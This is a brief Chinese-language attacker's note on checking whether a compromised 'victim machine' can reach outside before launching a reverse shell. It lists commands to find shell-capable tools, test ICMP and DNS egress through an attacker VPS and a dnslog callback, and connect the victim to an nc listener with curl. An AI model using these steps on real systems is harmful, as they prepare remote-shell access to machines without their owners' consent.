### 场景
拿到一个命令执行的口子后，想要反弹shell，需要先判断目标是否出网

### 解决
1、判断目标存在哪些反弹shell的命令
```
受害机上执行：whereis bash nc exec telnet python php perl ruby java go gcc g++
```
2、判断目标是否向外通icmp流量
```
方法1：
受害机上执行：ping -c 1 202.98.0.68>icmp.txt
受害机上执行：ls -alh
受害机上执行：cat icmp.txt

方法2：
VPS上执行：tcpdump -i eth0 -n -v icmp|grep -i "length 93"
受害机上执行：ping -s 65 -c 1 xx.xx.xx.xx
```
3、判断目标是否向外通dns流量
```
方法1：
受害机上执行：ping -c 1 www.baidu.com>dns.txt
受害机上执行：ls -alh
受害机上执行：cat dns.txt

方法2：
反连平台dnslog.cn上生成一个子域名
受害机上执行：ping xx.dnslog.cn
查看反连平台

查看一下/etc/resolv.conf及/etc/hosts

经测试，想要修改hosts，如下使用sudo是不行的：
sudo echo "127.0.0.2 www.baidu.com" >> /etc/hosts
只能是在root用户下执行，如下：
echo "127.0.0.2 www.baidu.com" >> /etc/hosts
```
3、判断目标向外通哪些端口
```
VPS上执行：nc -n -v -lp 3636
受害机上执行：curl http://xx.xx.xx.xx:3636
```

### 参考链接
https://www.freebuf.com/vuls/211847.html  
